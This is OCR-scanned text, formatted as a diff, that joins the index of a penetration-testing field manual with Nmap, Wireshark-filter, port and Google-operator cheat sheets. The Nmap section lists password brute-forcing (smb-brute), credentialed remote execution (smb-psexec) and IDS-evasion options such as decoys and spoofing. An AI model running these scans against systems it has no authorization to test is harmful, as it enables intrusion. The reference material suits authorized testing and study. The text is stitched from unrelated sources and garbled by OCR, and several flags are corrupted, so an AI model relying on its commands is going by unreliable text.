+policies, either expressed or implied, of TRUSTEDSEC, LLC. 
+
+[8] SSL and stunnel . http : //www . kioptrix . com/blog/ ?p~69~ . Accessed on 01 
+Feb 2013. 
+
+[9] "Using Nmap to Screenshot Web Services". 
+
+http : / /blog . spider labs . com/2012/ 0 6/ us inq-nmap-to- screenshot -web- 
+services ♦ html . Accessed on 26 Feb 2013. 
+
+[10] "Schtasks Persistence with PowerShell One Liners". 
+
+http : //blog . strateqiccvber . com/2013/ll/Q9/schtas):s-persi stence-with- 
+power shell-one-liners/ . Accessed on 21 Nov 2013. 
+
+
+94 
+
+
+
+Index 
+
+
+A 
+
+
+K 
+
+
+S 
+
+
+Airmon-ng 87 
+
+ARPing 61 
+
+ASCII Table 83 
+
+B 
+
+Basic Auth 69 
+
+BeEF 68 
+
+Bluetooth 86 
+
+C 
+
+Cisco 38 
+
+Curl 69 
+
+
+Kali 12 
+
+Kismet 85 
+
+L 
+
+Linux 5 
+
+Chkconfig 11 
+
+Files 7 
+
+Mount SMB 12 
+
+Scripting 8 
+
+Update-rc.d 11 
+
+Wifi 86 
+
+
+M 
+
+
+D 
+
+DNS 8, 30, 39, 43 
+
+DNSRecon 39 
+
+DSQuery 28 
+
+E 
+
+Email Sender 23 
+
+Ettercap 60 
+
+
+Metasploit 56 
+
+MSFPayload 56 
+
+MSFVenom 56 
+
+Meterpreter 24, 58 
+
+Mimikatz 61 
+
+MSSQL 73 
+
+MySQL 74 
+
+
+N 
+
+
+F 
+
+
+
+File Transfer 43 
+
+\ Fpipe 47 
+
+'Frequencies 85 
+
+rrP 43 
+
+G 
+
+^Google 48 
+
+GRUB 61 
+
+H 
+
+Hashing 64 
+
+f Hping3 61 
+
+Hydra 61 
+
+/ 
+
+} ICMP 43 
+
+Iframe 68 
+
+IKE-Scan 40 
+
+IPtables 10 
+
+IPv4 36 
+
+IPv6 37 
+
+
+Netcat 44, 53 
+
+Nmap 39, 51 
+
+Screenshot 70 
+
+O 
+
+Open Mail Relay 43 
+
+Oracle 74 
+
+P 
+
+Password Wordlist 62 
+
+PeepingTom 70 
+
+Perl 81 
+
+Persistence 46, 59 
+
+pfSense 13 
+
+Polycom 48 
+
+Ports 35 
+
+Postgres 73 
+
+Powershell 22 
+
+Authentication Popup. 23 
+
+Runas 23 
+
+Proxychains 58 
+
+PSEXEC 18, 46 
+
+Putty 40 
+
+Python 77 
+
+
+J 
+
+
+JAVA Applet 68 
+
+John the Ripper 62 
+
+
+R 
+
+
+Railgun 58 
+
+Regex 82 
+
+Reverse Shells 44 
+
+
+Scapy 80 
+
+Screen 11 
+
+SNMP 38 
+
+SNMPWalk 38 
+
+Socat 37, 47 
+
+Socks 47, 58 
+
+Solaris 13 
+
+SQLMap 71 
+
+SSH 55 
+
+Callback 9 
+
+Stunnel 47 
+
+Subnetting 36 
+
+T 
+
+Tandberg 48 
+
+TCPDump 12, 39 
+
+TCPReplay 39 
+
+Tunneling 47 
+
+U 
+
+User-Agents 67 
+
+V 
+
+VLC 54 
+
+Volume Shadow Copy 21 
+
+VPN 40 
+
+VSSOwn 63 
+
+VTC 48 
+
+W 
+
+Wget 68 
+
+Windows 15 
+
+AT Command 46 
+
+Escalation 31 
+
+Firewall 18 
+
+Makecab 17 
+
+Port Fwd 18 
+
+RDP 19 
+
+Registry 26 
+
+Remoting 16 
+
+Scripting 30 
+
+Startup 15 
+
+Task Scheduler 32, 46 
+
+WebDAV 46 
+
+Wine 61 
+
+Wireshark 52 
+
+WMIC 20, 46 
+
+X 
+
+Xll 12, 55 
+
+Xterm 45 
+
+
+95 
+
+
+
+9161874R00056 
+
+
+Made in the USA 
+San Bernardino, CA 
+06 March 2014 
+
+
+
+
+-sc Run default scripts 
+--script=<ScriptName> | 
+<ScriptCategory>|<ScriptDir>. . 
+
+Run individual or groups of scripts 
+
+--script-args=<Namel=Valuel , . . 
+
+Use the list of script arguments 
+
+--script-updatedb 
+
+Update script database 
+
+
+Script Categories 
+
+
+Nmap's script categories include, but are not limited to, the 
+following: 
+
+auth: Utilize credentials or bypass authentication on target 
+hosts. 
+
+broadcast: Discover hosts not included on command line by 
+broadcasting on local network. 
+
+brute: Attempt to guess passwords on target systems, for a 
+variety of protocols, including http, SNMP, IAX, MySQL, VNC, 
+etc. 
+
+default: Scripts run automatically when -sC or -A are used, 
+discovery: Try to learn more information about target hosts 
+through public sources of information, SNMP, directory services, 
+and more. 
+
+dos: May cause denial of service conditions in target hosts, 
+exploit: Attempt to exploit target systems, 
+external: Interact with third-party systems not included in 
+target list. 
+
+fuzzer: Send unexpected input in network protocol fields, 
+intrusive: May crash target, consume excessive resources, or 
+otherwise impact target machines in a malicious fashion, 
+malware: Look for signs of malware infection on the target 
+hosts. 
+
+safe: Designed not to impact target in a negative fashion, 
+version: Measure the version of software or protocol spoken 
+by target hosts. 
+
+vul: Measure whether target systems have a known 
+vulnerability. 
+
+
+A full list of Nmap Scripting Engine scripts is 
+available at http://nmap.org/nsedoc/ 
+
+Some particularly useful scripts include: 
+
+dns-zone-transfer: Attempts to pull a zone file 
+(AXFR) from a DNS server. 
+
+$ nmap --script dns- zone- 
+transfer. nse --script-args dns-zone- 
+transfer . domain=<domain> -p53 
+<hosts> 
+
+http-robots.txt: Harvests robots.txt files from 
+discovered web servers. 
+
+$ nmap --script http-robots.txt 
+<hosts> 
+
+smb-brute: Attempts to determine valid 
+username and password combinations via 
+automated guessing. 
+
+$ nmap --script smb-brute . nse -p445 
+<hosts> 
+
+smb-psexec: Attempts to run a series of 
+programs on the target machine, using 
+credentials provided as scriptargs. 
+
+$ nmap --script smb-psexec . nse - 
+script-args=smbuser=<username> , 
+smbpass=<password> [ , conf ig=<conf ig>] 
+-p445 <hosts> 
+
+
+
+INSTITUTE 
+
+
+Nmap 
+
+Cheat Sheet 
+
+vl .0 
+
+POCKET REFERENCE GUIDE 
+SANS Institute 
+
+http://www.sans.org 
+
+
+Base Syntax 
+
+
+# nmap [ScanType] [Options] {targets} 
+
+
+Target Specification 
+
+
+IPv4 address: 192.168.1.1 
+
+IPv6 address: AABB : CCDD : : FF%ethO 
+
+Host name: WWW . target . tgt 
+
+IP address range: 192.168. 0-255 . 0-255 
+
+CIDR block: 192 . 168 . 0 . 0/16 
+
+Use file with lists of targets: -iL <f iiename> 
+
+
+Target Ports 
+
+
+No port range specified scans 1,000 most popular 
+ports 
+
+-f Scan 100 most popular ports 
+-p<portl>-<port2> Port range 
+-p<portl>,<port2>, . . . Port List 
+-pU :53,U:110,T2 0-445 Mix TCP and UDP 
+-r Scan linearly (do not randomize ports) 
+
+— top-ports <n> Scan n most popular ports 
+-p-65535 Leaving off initial port in range make 
+
+
+- P o- 
+
+
+Leaving off initial port in range makes 
+Nmap scan start at port 1 
+Leaving off end port in range makes 
+Nmap scan through port 65535 
+Scan ports 1-65535 
+
+
+
+
+
+
+Probing Options 
+
+
+Pn Don't probe (assume all hosts are up) 
+pb Default probe (TCP 80, 445 & ICMP) 
+PS<portlist> 
+
+Check whether targets are up by probing TCP 
+ports 
+
+pe Use ICMP Echo Request 
+pp Use ICMP Timestamp Request 
+pm Use ICMP Netmask Request 
+
+
+Scan Types 
+
+
+sP Probe only (host discovery, not port scan) 
+
+sS SYN Scan 
+
+sT TCP Connect Scan 
+
+su UDP Scan 
+
+sv Version Scan 
+
+o OS Detection 
+
+-scanf lags Set custom list of TCP using 
+
+URGACKPSHRSTSYNFIN in any order 
+
+
+Fine-Grained Timing Options 
+
+
+--min-hostgroup/max-hostgroup <size> 
+Parallel host scan group sizes 
+
+--min-parallelism/max-parallelism 
+
+<numprobes> 
+
+Probe parallelization 
+
+--min-rtt-timeout/max-rtt- 
+
+timeout/ ini tial-rtt- timeout <time> 
+Specifies probe round trip time. 
+
+--max-retries <tries> 
+
+Caps number of port scan probe 
+retransmissions. 
+
+--host- timeout <time> 
+
+Give up on target after this long 
+
+- -scan-delay/ - -max- scan-delay < time> 
+Adjust delay between probes 
+
+- -min- rate <number> 
+
+Send packets no slower than 
+<number> per second 
+
+--max-rate <number> 
+
+Send packets no faster than 
+<number> per second 
+
+
+Aggregate Timing Options 
+
+
+TO Paranoid: Very slow, used for IDS evasion 
+ti Sneaky: Quite slow, used for IDS evasion 
+T2 Polite: Slows down to consume less 
+bandwidth, runs ~10 times slower than 
+default 
+
+T3 Normal: Default, a dynamic timing model 
+based on target responsiveness 
+T4 Aggressive: Assumes a fast and reliable 
+network and may overwhelm targets 
+T5 Insane: Very aggressive; will likely 
+overwhelm targets or miss open ports 
+
+
+Output Formats 
+
+
+on Standard Nmap output 
+oG Greppable format 
+ox XML format 
+oA <basename> 
+
+Generate Nmap, Greppable, and XML 
+output files using basename for files 
+
+
+Misc Options 
+
+
+-n Disable reverse IP address lookups 
+-6 Use IPv6 only 
+
+-a Use several features, including OS 
+
+Detection, Version Detection, Script 
+Scanning (default), and traceroute 
+— reason Display reason Nmap thinks port is 
+open, closed, or filtered 
+
+
+
+
+
+
+
+
+Target specification 
+
+IP address, hostnames, networks, etc 
+
+Example: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 
+-iL file input from list -iR n choose random targets, 0 never ending 
+--exclude — excludefile file exclude host or list from file 
+
+
+Service and version detection 
+
+-sV: version detection --all-ports dont exclude ports 
+
+--version-all try every single probe 
+--version-trace trace version scan activity 
+
+-O enable OS detection —fuzzy guess OS detection 
+
+--max-os-tries set the maximum number of tries against a target 
+
+Firewall/IDS evasion 
+
+-f fragment packets -D dl,d2 cloak scan with decoys 
+
+-S ip spoof source address -g source spoof source port 
+
+--randomize-hosts order --spoof-mac mac change the src mac 
+
+Verbosity and debugging options 
+
+-v Increase verbosity level --reason host and port reason 
+
+-d (1-9) set debugging level -packet-trace trace packets 
+
+Interactive options 
+
+v/V increase/decrease verbosity level 
+d/D increase/decrease debugging level 
+p/P turn on/off packet tracing 
+
+Miscellaneous options 
+
+--resume file resume aborted scan (from oN or oG output) 
+
+-6 enable ipv6 scanning 
+-A agressive same as -O -sV -sC --traceroute 
+
+Scripts 
+
+-sC perform scan with default scripts --script file run script (or all) 
+
+--script-args n=v provide arguments 
+
+--script-trace print incoming and outgoing communication 
+
+Output 
+
+-oN normal -oX xml -oG grepable -oA all outputs 
+
+
+Host discovery 
+
+-PS n tcp syn ping 
+-PM netmask req 
+-sL list scan 
+-n no DNS 
+
+
+-PA n tcp ack ping -PU n udp ping 
+
+-PP timestamp req -PE echo req 
+
+-PO protocol ping -PN no ping 
+
+-R DNS resolution for all targets 
+
+
+—traceroute: trace path to host (for topology map) 
+
+-sP ping same as -PP -PM -PS443 -PA80 
+
+Port scanning techniques 
+
+-sS tcp syn scan -sT tcp connect scan -sU udp scan 
+
+-sY sctp init scan -sZ sctp cookie echo -sO ip protocol 
+
+-sW tcp window -sN -sF -sX null, fin, xmas -sA tcp ack 
+
+
+Port specification and scan order 
+
+-p n-m range -p- all ports 
+
+-p U:n-m,z T:n,m U for udp T for tcp 
+--top-ports n scan the highest-ratio ports 
+
+
+-p n,m,z individual 
+
+-F fast, common 100 
+-r don’t randomize 
+
+
+Timing and performance 
+
+-TO paranoid -T1 sneaky 
+
+-T3 normal -T4 aggresive 
+
+--min-hostgroup --max-hostgroup 
+
+— min-rate --max-rate 
+
+--min-parallelism --max-parallelism 
+
+— min-rtt-timeout — max-rtt-timeout 
+
+--max-retries --host-timeout 
+
+
+-T2 polite 
+-T5 insane 
+
+
+--initial-rtt-timeout 
+
+--scan-delay 
+
+
+
+Examples 
+Quick scan 
+Fast scan (port80) 
+Pingscan 
+
+Slow comprehensive 
+Quick traceroute: 
+
+
+nmap -T4 -F 
+
+nmap -T4 — max rtt timeout 200 — initialrtttimeout 150 — min hostgroup 512 — maxretries 0 -n -PO -p80 
+nmap -sP -PE -PP -PS21, 23, 25, 80,1 13,31339 -PA80, 11 3,443, 10042 -source-port 53 -T4 
+nmap -sS -sU -T4 -A -v -PE -PP -PS21, 22, 23, 25, 80,1 13,31339 -PA80,1 13,443,10042 -PO -script all 
+nmap -sP -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO -traceroute 
+
+
+
+
+
+
+Wireshark Display Filters • Part 1 packetnfe.net 
+
+
+eth.addr 
+
+eth.dst 
+
+eth.ig 
+
+vlan . cfi 
+vlan.etype 
+
+
+Ethernet 
+
+eth.len 
+
+eth.ig 
+
+eth. multicast 
+
+IEEE 802. IQ 
+
+vlan. id 
+vlan.len 
+
+
+eth.src 
+eth. trailer 
+eth. type 
+
+vlan. priority 
+vlan. trailer 
+
+
+IPv4 
+
+ip.addr ip 
+ip. checksum ip 
+ip . checksumbad ip 
+ip . checksum_good ip 
+ip.dsfield ip 
+ip.dsfield.ee ip 
+ip.dsfield.dscp ip 
+ip.dsfield.ect ip 
+ip.dst ip 
+ip.dst_host ip 
+ip. flags ip 
+ip.flags.df ip 
+ip.flags.mf ip 
+ip.flags.rb ip 
+ip.f rag_offset ip 
+ip. fragment ip 
+ip .fragment .error ip 
+ip . f ragment . multipletails ip 
+ip .fragment . overlap ip 
+
+
+. fragment .overlap. conflict 
+
+. f ragment . toolongf ragment 
+
+.fragments 
+
+. hdr_len 
+
+.host 
+
+.id 
+
+.len 
+
+.proto 
+
+. reassembled_in 
+.src 
+
+. src_host 
+.tos 
+
+.tos.cost 
+.tos. delay 
+.tos. precedence 
+.tos. reliability 
+.tos. throughput 
+.ttl 
+
+.version 
+
+
+IPv6 
+
+ipv6.addr ipv6. 
+
+ipv6. class ipv6, 
+
+ipv6.dst ipv6, 
+
+ipv6 . dst_host ipv6 , 
+
+ipv6.dst_opt ipv6, 
+
+ipv6.flow ipv6, 
+
+ipv6 . f ragment ipv6 . 
+
+ipv6 .fragment .error ipv6 , 
+
+ipv6 .fragment . more ipv6 , 
+
+ipv6 . f ragment . multipletails ipv6 , 
+ipv6 .fragment . offset ipv6 , 
+
+ipv6 .fragment . overlap ipv6 , 
+
+ipv6 .fragment . overlap . conflict ipv6 . routing_hd r . left 
+ipv6 . f ragment . toolongf ragment 
+
+
+hop_opt 
+
+host 
+
+mipv6_home_add ress 
+
+mipv6_length 
+
+mipv6_type 
+
+nxt 
+
+opt . padl 
+opt . padn 
+plen 
+
+reassembled_in 
+routing_hdr 
+routing_hdr .addr 
+
+
+arp.dst .hw_mac 
+
+ARP 
+
+arp. proto. size 
+
+arp . dst . proto_ipv4 
+
+arp. proto. type 
+
+arp.hw.size 
+
+arp.src.hwjnac 
+
+arp. hw. type 
+
+arp . src . proto_ipv4 
+
+arp. opcode 
+
+
+
+TCP 
+
+tcp.ack 
+
+tcp. options. qs 
+
+tcp. checksum 
+
+tcp. options. sack 
+
+tcp.checksumbad 
+
+tcp . options . sackjle 
+
+tcp . checksum_good 
+
+tcp . options . sack_perm 
+
+tcp . continuation_to 
+
+tcp . options . sack_re 
+
+tcp.dstport 
+
+tcp . options . time_stamp 
+
+tcp. flags 
+
+tcp . options . wscale 
+
+tcp. flags. ack 
+
+tcp . options . wscale_val 
+
+tcp. flags. cwr 
+
+tcp . pdu . last_f rame 
+
+tcp. flags. ecn 
+
+tcp. pdu. size 
+
+tcp. flags. fin 
+
+tcp. pdu. time 
+
+tcp. flags. push 
+
+tcp. port 
+
+tcp. flags. reset 
+
+tcp. reassembled_in 
+
+tcp. flags. syn 
+
+tcp. segment 
+
+tcp. flags. urg 
+
+tcp. segment .error 
+
+tcp.hdrjlen 
+
+tcp . segment . multipletails 
+
+tcp. len 
+
+tcp . segment . overlap 
+
+tcp.nxtseq 
+
+tcp . segment . overlap . conflict 
+
+tcp. options 
+
+tcp . segment . toolongf ragment 
+
+tcp.options.ee 
+
+tcp. segments 
+
+tcp. options . ccecho 
+
+tcp.seq 
+
+tcp. options. ccnew 
+
+tcp.srcport 
+
+tcp. options .echo 
+
+tcp.time_delta 
+
+
+tep . options . echo_reply 
+tcp. options. md5 
+
+
+tep . time_relative 
+tcp. urgent_pointer 
+
+
+tcp. options. mss 
+
+tcp.window_size 
+
+tcp . options . mss_val 
+
+
+UDP 
+
+udp. checksum 
+
+udp.dstport udp. s report 
+
+udp.checksumbad 
+
+udp. length 
+
+udp . checksum_good 
+
+udp. port 
+
+
+Operators 
+
+eq or == 
+ne or != 
+gt or > 
+
+
+and or && 
+or or || 
+xor or ^ 
+
+
+Logic 
+
+Logical AND 
+Logical OR 
+Logical XOR 
+
+
+ipv6. fragments 
+
+ipv6.src 
+
+It or < 
+
+not or ! 
+
+Logical NOT 
+
+ipv6.f ragment .id 
+
+ipv6.src_host 
+
+ge or >= 
+
+[n] [...] 
+
+Substring operator 
+
+ipv6.hlim 
+
+ipv6. version 
+
+le or <= 
+
+
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+
+
+Wireshark Display Filters • Part 2 packetnfe.net 
+
+
+Frame Relay 
+
+fr.becn fr.de 
+
+ICMPv6 
+
+icmpv6 . all_comp icmpv6 . option . name_type . f qdn 
+
+f r . chdlctype f r . dlci 
+
+icmpv6 . checksum icmpv6 . option . name_x501 
+
+f r . control f r .dlcore_control 
+
+icmpv6 . checksumbad icmpv6 . option . rsa . keyhash 
+
+fr. control. f f r.ea 
+
+f r . control . f type f r . fecn 
+
+f r . cont rol . n_r f r . lowe r_dlci 
+
+f r . cont rol . n_s f r . nlpid 
+
+icmpv6 . code icmpv6 . option . type 
+
+icmpv6 . comp icmpv6 . ra . cu r_hop_limit 
+
+icmpv6 . haad . ha_add rs icmpv6 . ra . reachable_time 
+
+icmpv6. identifier icmpv6. ra. retrans_timer 
+
+f r . control . p f r . second_dlci 
+
+icmpv6 . option icmpv6 . ra . router_lif etime 
+
+f r . control . s_f type f r . snap . oui 
+f r . cont rol . u_modif ie r_cmd f r . snap . pid 
+f r . control . u_modif ier_resp f r . snaptype 
+
+icmpv6 . option . cga icmpv6 . recursive_dns_serv 
+
+icmpv6 . option . length icmpv6 . type 
+
+icmpv6 . option . name_type 
+
+f r .cr f r .third_dlci 
+
+f r .dc f r .upper_dlci 
+
+RIP 
+
+rip . auth . passwd rip . ip rip . route_tag 
+
+rip. auth. type rip. metric rip. routing_domain 
+
+rip . command rip . netmask rip . version 
+
+rip . family rip . next_hop 
+
+PPP 
+
+ppp . add ress ppp . direction 
+
+ppp . cont rol ppp . protocol 
+
+MPLS 
+
+mpls . bottom mpls . oam . def ectjlocation 
+
+BGP 
+
+bgp.aggregatoras bgp.mp_reach_nlri_ipv4_prefix 
+
+mpls . cw. cont rol mpls . oam . def ect_type 
+
+bgp.aggregator_origin bgp.mp_unreach_nlri_ipv4_prefix 
+
+mpls.cw. res mpls. oam. frequency 
+
+bgp . as_path bgp . multi_exit_disc 
+
+mpls . exp mpls . oam . f unction_type 
+
+mpls . label mpls . oam . ttsi 
+
+mpls . oam . bipl6 mpls . ttl 
+
+bgp . clusteridentif ier bgp . next_hop 
+
+bgp . cluster_list bgp . nlri_pref ix 
+
+bgp . communityas bgp . o rigin 
+
+ICMP 
+
+icmp. checksum icmp.ident icmp.seq 
+
+icmp . checksumbad icmp . mtu icmp . type 
+
+bgp . community_value bgp . originator_id 
+
+bgp . local_p ref bgp . type 
+
+bgp . mp_nl ri_t nl_id bgp . wit hd rawn_p refix 
+
+icmp . code icmp . redir_gw 
+
+HTTP 
+
+DTP 
+
+dtp . neighbor dtp . tlv_type vtp . neighbor 
+
+dtp . tlv_len dtp . version 
+
+http . accept http . proxy_authorization 
+
+http . accept_encoding http . proxy_connect_host 
+
+http . accept_language http . proxy_connect_port 
+
+http.authbasic http. referer 
+
+VTP 
+
+vtp . code vtp . vlan_inf o . 802_10_index 
+
+http. authorization http. request 
+
+http. cache_control http. request .method 
+
+vtp . conf_rev_num vtp . vlan_inf o . isl_vlan_id 
+
+vtp . followers vtp . vlan_inf o . len 
+
+http. connection http. request. uri 
+
+http. content_encoding http. request .version 
+
+vtp . md vtp . vlan_inf o . mtu_size 
+
+http.contentjlength http. response 
+
+vtp . md5_digest vtp . vlan_inf o . status . vlan_susp 
+
+http . content_type http . response . code 
+
+vtp . md_len vtp . vlan_inf o . tlv_len 
+
+vtp . seq_num vtp . vlan_inf o . tlv_type 
+
+vtp . sta rt_value vtp . vlan_inf o . vlan_name 
+
+http. cookie http. server 
+
+http . date http . set_cookie 
+
+http. host http. transfer_encoding 
+
+vtp . upd_id vtp . vlan_inf o . vlan_name_len 
+
+vtp . upd_ts vtp . vlan_inf o . vlan_type 
+
+vtp. version 
+
+http . last jnodif ied http . user_agent 
+
+http. location http.wwwauthenticate 
+
+http . notification http . x_f orwarded_f or 
+
+http . proxy_authenticate 
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+
+Common Ports 
+
+
+packetlife.net 
+
+
+TCP/UDP Port Numbers 
+
+
+7 
+
+Echo 
+
+554 
+
+RTSP 
+
+19 
+
+Chargen 
+
+546-547 
+
+DHCPv6 
+
+20-21 
+
+FTP 
+
+560 
+
+rmonitor 
+
+22 
+
+SSH/SCP 
+
+563 
+
+NNTP over SSL 
+
+23 
+
+Telnet 
+
+587 
+
+SMTP 
+
+25 
+
+SMTP 
+
+591 
+
+FileMaker 
+
+42 
+
+WINS Replication 
+
+593 
+
+Microsoft DCOM 
+
+43 
+
+WHOIS 
+
+631 
+
+Internet Printing 
+
+49 
+
+TACACS 
+
+636 
+
+LDAP over SSL 
+
+53 
+
+DNS 
+
+639 
+
+MSDP (PIM) 
+
+67-68 
+
+DHCP/BOOTP 
+
+646 
+
+LDP (MPLS) 
+
+69 
+
+TFTP 
+
+691 
+
+MS Exchange 
+
+70 
+
+Gopher 
+
+860 
+
+iSCSI 
+
+79 
+
+Finger 
+
+873 
+
+rsync 
+
+80 
+
+HTTP 
+
+902 
+
+VMware Server 
+
+88 
+
+Kerberos 
+
+989-990 
+
+FTP over SSL 
+
+102 
+
+MS Exchange 
+
+993 
+
+IMAP4 over SSL 
+
+110 
+
+POP3 
+
+995 
+
+POP3 over SSL 
+
+113 
+
+Ident 
+
+1025 
+
+Microsoft RPC 
+
+119 
+
+NNTP (Usenet) 
+
+1026-1029 
+
+Windows Messenger 
+
+123 
+
+NTP 
+
+1080 
+
+SOCKS Proxy 
+
+135 
+
+Microsoft RPC 
+
+1080 
+
+MyDoom 
+
+137-139 
+
+NetBIOS 
+
+1194 
+
+OpenVPN 
+
+143 
+
+IMAP4 
+
+1214 
+
+Kazaa 
+
+161-162 
+
+SNMP 
+
+1241 
+
+Nessus 
+
+177 
+
+XDMCP 
+
+1311 
+
+Dell OpenManage 
+
+179 
+
+BGP 
+
+1337 
+
+WASTE 
+
+201 
+
+AppleTalk 
+
+1433-1434 
+
+Microsoft SQL 
+
+264 
+
+BGMP 
+
+1512 
+
+WINS 
+
+318 
+
+TSP 
+
+1589 
+
+Cisco VQP 
+
+381-383 
+
+HP Openview 
+
+1701 
+
+L2TP 
+
+389 
+
+LDAP 
+
+1723 
+
+MS PPTP 
+
+411-412 
+
+Direct Connect 
+
+1725 
+
+Steam 
+
+443 
+
+HTTP over SSL 
+
+1741 
+
+CiscoWorks 2000 
+
+445 
+
+Microsoft DS 
+
+1755 
+
+MS Media Server 
+
+464 
+
+Kerberos 
+
+1812-1813 
+
+RADIUS 
+
+465 
+
+SMTP over SSL 
+
+1863 
+
+MSN 
+
+497 
+
+Retrospect 
+
+1985 
+
+Cisco HSRP 
+
+500 
+
+ISAKMP 
+
+2000 
+
+Cisco SCCP 
+
+512 
+
+rexec 
+
+2002 
+
+Cisco ACS 
+
+513 
+
+rlogin 
+
+2049 
+
+NFS 
+
+514 
+
+syslog 
+
+2082-2083 
+
+cPanel 
+
+515 
+
+LPD/LPR 
+
+2100 
+
+Oracle XDB 
+
+520 
+
+RIP 
+
+2222 
+
+DirectAdmin 
+
+521 
+
+RIPng (IPv6) 
+
+2302 
+
+Halo 
+
+540 
+
+UUCP 
+
+2483-2484 
+
+Oracle DB 
+
+
+2745 
+
+Bagle.H 
+
+6891-6901 
+
+Windows Live 
+
+2967 
+
+Symantec AV 
+
+6970 
+
+Quicktime 
+
+3050 
+
+Interbase DB 
+
+7212 
+
+GhostSurf 
+
+3074 
+
+XBOX Live 
+
+7648-7649 
+
+CU-SeeMe 
+
+3124 
+
+HTTP Proxy 
+
+8000 
+
+Internet Radio 
+
+3127 
+
+MyDoom 
+
+8080 
+
+HTTP Proxy 
+
+3128 
+
+HTTP Proxy 
+
+8086-8087 
+
+Kaspersky AV 
+
+3222 
+
+GLBP 
+
+8118 
+
+Privoxy 
+
+3260 
+
+iSCSI Target 
+
+8200 
+
+VMware Server 
+
+3306 
+
+MySQL 
+
+8500 
+
+Adobe ColdFusion 
+
+3389 
+
+Terminal Server 
+
+8767 
+
+TeamSpeak 
+
+3689 
+
+iTunes 
+
+8866 
+
+Bagle.B 
+
+3690 
+
+Subversion 
+
+9100 
+
+HP JetDirect 
+
+3724 
+
+World of Warcraft 
+
+9101-9103 
+
+Bacula 
+
+3784-3785 
+
+Ventrilo 
+
+9119 
+
+MXit 
+
+4333 
+
+mSQL 
+
+9800 
+
+WebDAV 
+
+4444 
+
+Blaster 
+
+9898 
+
+Dabber 
+
+4664 
+
+Google Desktop 
+
+9988 
+
+Rbot/Spybot 
+
+4672 
+
+eMule 
+
+9999 
+
+Urchin 
+
+4899 
+
+Radmin 
+
+10000 
+
+Webmin 
+
+5000 
+
+UPnP 
+
+10000 
+
+BackupExec 
+
+5001 
+
+Slingbox 
+
+10113-10116 
+
+NetlQ 
+
+5001 
+
+iperf 
+
+11371 
+
+OpenPGP 
+
+5004-5005 
+
+RTP 
+
+12035-12036 
+
+Second Life 
+
+5050 
+
+Yahoo! Messenger 
+
+12345 
+
+NetBus 
+
+5060 
+
+SIP 
+
+13720-13721 
+
+NetBackup 
+
+5190 
+
+AIM/ICQ 
+
+14567 
+
+Battlefield 
+
+5222-5223 
+
+XMPP/Jabber 
+
+15118 
+
+Dipnet/Oddbob 
+
+5432 
+
+PostgreSQL 
+
+19226 
+
+AdminSecure 
+
+5500 
+
+VNC Server 
+
+19638 
+
+Ensim 
+
+5554 
+
+Sasser 
+
+20000 
+
+Usermin 
+
+5631-5632 
+
+pcAnywhere 
+
+24800 
+
+Synergy 
+
+5800 
+
+VNC over HTTP 
+
+25999 
+
+Xfire 
+
+5900+ 
+
+VNC Server 
+
+27015 
+
+Half-Life 
+
+6000-6001 
+
+Xll 
+
+27374 
+
+Sub7 
+
+6112 
+
+Battle.net 
+
+28960 
+
+Call of Duty 
+
+6129 
+
+DameWare 
+
+31337 
+
+Back Orifice 
+
+6257 
+
+WinMX 
+
+33434+ 
+
+traceroute 
+
+6346-6347 
+
+Gnutella 
+
+Legend 
+
+6500 
+
+GameSpy Arcade 
+
+Chat 
+
+6566 
+
+6588 
+
+SANE 
+
+AnalogX 
+
+Encrypted 
+
+Gaming 
+
+6665-6669 
+
+IRC 
+
+| Malicious 
+
+6679/6697 
+
+IRC over SSL 
+
+Peer to Peer 
+
+6699 
+
+Napster 
+
+Streaming 
+
+6881-6999 
+
+BitTorrent 
+
+
+IANA port assignments published at http://www.iana.org/assignments/port-numbers 
+
+
+by Jeremy Stretch 
+
+
+vl.l 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Advanced Operators 
+
+
+Advanced Operators 
+
+Meaning 
+
+What To Type Into Search Box (& Description of Results) 
+
+site: 
+
+Search only one website 
+
+conference site:www.sans.org (Search SANS site for conference info) 
+
+[#]...[#] or numrange: 
+
+Search within a range of numbers 
+
+plasma television $1000. ..1500 (Search for plasma televisions between $1000 and $1500) 
+
+date: 
+
+Search only a range of months 
+
+hockey date: 3 (Search for hockey references within past 3 months; 6 and 12-month date- 
+restrict options also available) 
+
+safesearch: 
+
+Exclude adult-content 
+
+safesearch: sex education (Search for sex education material without returning adult sites) 
+
+link: 
+
+linked pages 
+
+link:www.sans.org (Find pages that link to the SANS website) 
+
+info: 
+
+Info about a page 
+
+info:www.sans.org (Find information about the SANS website) 
+
+related: 
+
+Related pages 
+
+related:www.stanford.edu (Find websites related to the Stanford website) 
+
+intitle: 
+
+Searches for strings in the 
+title of the page 
+
+intitle:conference (Find pages with "conference" in the page title) 
+
+allintitle: 
+
+Searches for all strings within 
+the page title 
+
+allintitle:conference SANS (Find pages with "conference" and "SANS" in the page title. 
+Doesn't combine well with other operators) 
+
+inurl: 
+
+Searches for strings in the URL 
+
+inurkconference (Find pages with the string "conference" in the URL) 
+
+allinurl: 
+
+Searches for all strings 
+within the URL 
+
+allinurkconference SANS (Find pages with “conference” and "SANS" in the URL. 
+
+Doesn't combine well with other operators) 
+
+filetype: or ext: 
+
+Searches for files with that 
+file extension 
+
+filetype:ppt (Find files with the "ppt" file extension. 
+
+".ppt" are MS PowerPoint files.) 
+
+cache: 
+
+Display the Google cache 
+of the page 
+
+cache:www.sans.org (Show the cached version of the page without performing the search) 
+
+Phonebook: or 
+rphonebook: or 
+bphonebook 
+
+Display all, residential, 
+business phone listings 
+
+phonebook:Rick Smith MD (Find all phone book listing for Rick Smith in Maryland. 
+
+Cannot combine with other searches) 
+
+author: 
+
+Searches for the author of a 
+newsgroup post 
+
+author:Rick (Find all newsgroup postings with "Rick" in the author name or email address. 
+Must be used with a Google Group search) 
+
+insubject: 
+
+Search only in the subject of a 
+newsgroup post 
+
+insubject: Mac OS X (Find all newsgroup postings with "Mac OS X" in the subject of the 
+post. Must be used with a Google Group search) 
+
+define: 
+
+Various definitions of the word 
+or phrase 
+
+define:sarcastic (Get the definition of the word sarcastic) 
+
+stock: 
+
+Get information on a stock 
+
+abbreviation 
+
+stock:AAPL (Get the stock information for Apple Computer ; Inc.) 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
